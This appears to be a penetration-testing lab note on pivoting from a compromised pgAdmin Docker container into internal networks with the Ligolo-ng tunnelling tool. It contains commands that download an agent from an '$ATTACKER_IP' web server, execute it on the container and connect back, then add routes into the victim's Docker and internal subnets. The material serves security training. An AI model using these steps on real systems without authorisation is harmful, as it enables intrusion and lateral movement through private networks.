Let’s map your environment:

 ✔ You are inside a Docker container
 ✔ The internal network is `172.18.0.0/16`
 ✔ There are multiple internal services:
- Web app → `172.18.0.2`
- PostgreSQL → `172.18.0.3`
- Possibly more containers

✔ You want to explore the internal network
✔ You want to understand how services relate to the host

**Ligolo-ng is the better fit**
because your goal is **network exploration**, not just tunneling a single port.


---

## Installing Ligolo‑ng


#Attacking_machine 

- Run this code on the same directory 

```
# Download Ligolo-ng
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Extract
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

![[ligolo-ng.proxy.png]]

### Schema: Conceptual Flow of a TUN Interface + Proxy Component

![[Diagram_TUN_PROXY.svg|840x646]]



#Attacking_machine 
- Open a python web server on the same directory you install *ligolo-ng*.
```
python3 -m http.server 8000
```


## Downloading and executing agent on container

#pgAdmin_container_shell 
Download and execute agent on container 

```
wget http://$ATTACKER_IP:8000/agent 
chmod +x agent 
./agent -connect $ATTACKER_IP:11601 -ignore-cert
```

![[ligolo-ng.agent.png]]

Once your *ligolo‑ng agent* is connected, the key is to shift your mindset from “I have a shell on a machine” to **“I now have a network foothold that can forward traffic for me.”** That change in perspective makes internal network access much easier to understand.
## Adding routing 

Add routes so your machine can reach internal subnets.
When the agent connects to your relay, it becomes a **gateway** into whatever networks _that machine_ can reach.

If the target host can reach:

- its Docker network
- its corporate LAN
- its private VLAN
- its management subnet

…then _you_ can reach those networks too, **as long as you route traffic through the ligolo interface**.

#Attaking_machine 
- Route Docker network 

```
sudo ip route add 172.18.0.0/24 dev ligolo
```
 
 - Route internal network (discovered later)

```
sudo ip route add 192.168.100.0/24 dev ligolo
```

You’re telling your own machine:

> “If you want to talk to these networks, send the packets through the tunnel.”

![[Diagram_internal_Docker_Network.svg|674x965]]